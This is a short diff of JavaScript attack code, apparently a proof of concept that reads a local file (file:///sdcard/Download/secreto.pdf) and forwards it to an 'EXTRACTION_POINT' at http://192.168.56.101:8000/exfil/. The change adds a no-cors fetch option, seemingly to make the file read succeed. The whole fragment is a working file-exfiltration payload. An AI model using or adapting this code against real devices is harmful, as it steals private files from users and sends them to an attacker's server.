@@ -6,7 +6,7 @@
 		const URI = "file:///sdcard/Download/secreto.pdf";
 		const EXTRACTION_POINT = "http://192.168.56.101:8000/exfil/"
 
-		fetch(URI)
+		fetch(URI, { mode: "no-cors", method: "GET" })
 			.then(response => response.blob())
 			.then(data => {
 				fetch(EXTRACTION_POINT, {
